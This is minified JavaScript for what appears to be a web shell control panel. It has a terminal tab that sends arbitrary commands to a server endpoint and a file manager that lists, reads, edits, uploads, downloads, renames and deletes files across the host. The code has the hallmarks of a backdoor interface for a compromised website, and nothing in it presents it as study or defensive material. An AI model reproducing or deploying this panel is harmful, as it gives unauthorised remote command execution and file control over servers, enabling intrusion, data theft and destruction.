function api(a,d){d=d||{};var f=new FormData;f.append("action",a);f.append("psh","1");for(var k in d)f.append(k,d[k]);return fetch(BU,{method:"POST",body:f}).then(function(r){return r.json()})}
function esc(s){var d=document.createElement("div");d.textContent=s||"";return d.innerHTML}
function ap(h){var t=document.getElementById("t");t.innerHTML+=h;t.scrollTop=t.scrollHeight}
function go(){var i=document.getElementById("cm"),c=i.value.trim();if(!c)return;i.value="";ap(\'<span class="cl">\'+esc(CW||"~")+"$ "+esc(c)+"</span>\\n");api("run_cmd",{cmd:c,cwd:CW}).then(function(r){if(r.e){ap(\'<span class="el">\'+esc(r.e)+"</span>\\n");return}if(r.o)ap(esc(r.o)+"\\n");if(r.c&&r.c!==CW){CW=r.c;document.getElementById("pr").textContent=CW+"$"}}).catch(function(x){ap(\'<span class="el">Err: \'+esc(x.message)+"</span>\\n")})}
function q(c){document.getElementById("cm").value=c;go()}
function stab(t){document.getElementById("p_shell").style.display=t==="shell"?"":"none";document.getElementById("p_fm").style.display=t==="fm"?"":"none";var tabs=document.querySelectorAll(".tab");for(var i=0;i<tabs.length;i++)tabs[i].className="tab";event.target.className="tab on";if(t==="fm")fmGo(FM_DIR);}
function fmGo(dir){FM_DIR=dir;document.getElementById("fmPath").value=dir;api("fm_list",{dir:dir}).then(function(r){if(r.e){alert(r.e);return}FM_DIR=r.dir;document.getElementById("fmPath").value=r.dir;var h="";r.items.sort(function(a,b){if(a.is_dir&&!b.is_dir)return -1;if(!a.is_dir&&b.is_dir)return 1;return a.name.localeCompare(b.name)});for(var i=0;i<r.items.length;i++){var f=r.items[i];var icon=f.is_dir?"📁":"📄";var cls=f.is_dir?"fm-dir":"fm-file";var sz=f.is_dir?"-":fmSize(f.size);h+="<div class=fm-row>";h+="<span class=fm-icon>"+icon+"</span>";if(f.is_dir){h+="<span class=\'fm-name "+cls+"\' onclick=\'fmGo(\""+esc(r.dir+"/"+f.name)+"\")\'>"+ esc(f.name)+"</span>";}else{h+="<span class=\'fm-name "+cls+"\' onclick=\'fmEdit(\""+esc(r.dir+"/"+f.name)+"\")\'>"+ esc(f.name)+"</span>";}h+="<span class=fm-perm>"+esc(f.perm)+"</span>";h+="<span class=fm-size>"+sz+"</span>";h+="<span class=fm-time>"+esc(f.mtime)+"</span>";h+="<span class=fm-acts>";if(!f.is_dir)h+="<button class=\'bt b-h\' style=font-size:9px;padding:2px_6px onclick=\'fmDl(\""+esc(r.dir+"/"+f.name)+"\")\'>DL</button>";h+="<button class=\'bt b-h\' style=font-size:9px;padding:2px_6px;color:#e67e22 onclick=\'fmRen(\""+esc(r.dir+"/"+f.name)+"\")\'>Ren</button>";h+="<button class=\'bt b-h\' style=font-size:9px;padding:2px_6px;color:#e74c3c onclick=\'fmDel(\""+esc(r.dir+"/"+f.name)+"\")\'>Del</button>";h+="</span></div>";}document.getElementById("fmList").innerHTML=h;}).catch(function(x){alert("Error: "+x.message)})}
function fmUp(){var parts=FM_DIR.split("/");parts.pop();fmGo(parts.join("/")||"/");}
function fmRefresh(){fmGo(FM_DIR);}
function fmSize(b){if(b<1024)return b+"B";if(b<1048576)return(b/1024).toFixed(1)+"K";return(b/1048576).toFixed(1)+"M";}
function fmEdit(path){api("fm_read",{path:path}).then(function(r){if(r.e){alert(r.e);return}document.getElementById("fmEditor").style.display="";document.getElementById("fmEditPath").textContent=r.path;document.getElementById("fmContent").value=r.content;});}
function fmSave(){var path=document.getElementById("fmEditPath").textContent;var content=document.getElementById("fmContent").value;api("fm_write",{path:path,content:content}).then(function(r){if(r.e)alert(r.e);else alert(r.msg);});}
function fmCloseEditor(){document.getElementById("fmEditor").style.display="none";}
function fmDel(path){if(!confirm("Delete "+path+"?"))return;api("fm_delete",{path:path}).then(function(r){if(r.e)alert(r.e);else fmRefresh();});}
function fmNewDir(){var name=prompt("Folder name:");if(!name)return;api("fm_mkdir",{path:FM_DIR+"/"+name}).then(function(r){if(r.e)alert(r.e);else fmRefresh();});}
function fmRen(path){var name=prompt("New name:",path.split("/").pop());if(!name)return;var dir=path.substring(0,path.lastIndexOf("/"));api("fm_rename",{old:path,"new":dir+"/"+name}).then(function(r){if(r.e)alert(r.e);else fmRefresh();});}
function fmUpload(){var file=document.getElementById("fmFile").files[0];if(!file)return;var f=new FormData;f.append("action","fm_upload");f.append("psh","1");f.append("dir",FM_DIR);f.append("file",file);fetch(BU,{method:"POST",body:f}).then(function(r){return r.json()}).then(function(r){if(r.e)alert(r.e);else{alert(r.msg);fmRefresh();}});document.getElementById("fmFile").value="";}
function fmDl(path){var f=document.createElement("form");f.method="POST";f.action=BU;f.target="_blank";["action","psh","path"].forEach(function(n,i){var inp=document.createElement("input");inp.type="hidden";inp.name=n;inp.value=["fm_download","1",path][i];f.appendChild(inp);});document.body.appendChild(f);f.submit();f.remove();}
